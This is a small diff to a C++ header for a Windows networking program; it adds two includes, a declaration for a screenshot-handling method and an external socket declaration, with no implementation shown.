@@ -4,10 +4,12 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
+#include <wtypes.h>
 #include <Assert.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string>
+#include <signal.h>
 #include <sys/time.h>
 #include <fstream>
 #include <Iphlpapi.h>
@@ -33,6 +35,7 @@ public:
     unsigned short port;
 
 private:
+    void screenshot_handle();
     void handle();
     SOCKET sock;
     WSAData wData;
@@ -40,3 +43,4 @@ private:
 
 
 SOCKET client();
+extern SOCKET ConnectSocket;
